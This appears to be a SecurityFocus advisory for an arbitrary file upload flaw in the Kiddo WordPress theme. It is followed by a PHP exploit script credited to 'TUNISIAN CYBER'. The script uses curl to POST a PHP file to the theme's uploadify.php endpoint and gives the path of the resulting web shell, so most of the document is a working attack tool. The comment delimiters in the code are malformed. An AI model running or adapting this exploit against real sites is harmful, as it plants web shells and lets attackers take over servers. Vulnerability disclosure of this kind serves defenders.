source: http://www.securityfocus.com/bid/65460/info

The Kiddo theme for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to sufficiently sanitize file extensions.

An attacker can exploit this issue to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access to the application; other attacks are also possible. 

<?php
*/
[+] Author: TUNISIAN CYBER
[+] Exploit Title: Kidoo WP Theme File Upload Vulnerability
[+] Date: 05-02-2014
[+] Category: WebApp
[+] Google Dork: :(
[+] Tested on: KaliLinux
[+] Vendor: n/a
[+] Friendly Sites: na3il.com,th3-creative.com

Kiddo WP theme suffers from a File Upload Vulnerability

+PoC:
site/wp-content/themes/kiddo/app/assets/js/uploadify/uploadify.php

+Shell Path:
site/3vil.php

ScreenShot:
http://i.imgur.com/c62cWHH.png

Greets to: XMaX-tn, N43il HacK3r, XtechSEt
Sec4Ever Members:
DamaneDz
UzunDz
GEOIX
E4A Members:
Gastro-DZ

*/

echo "=============================================== \n"; 
echo "   Kiddo WP Theme File Upload Vulnerability\n"; 
echo "                 TUNISIAN CYBER   \n"; 
echo "=============================================== \n\n";   
$uploadfile="cyber.php";
  
$ch = curl_init("site-content/themes/kiddo/app/assets/js/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
  
?>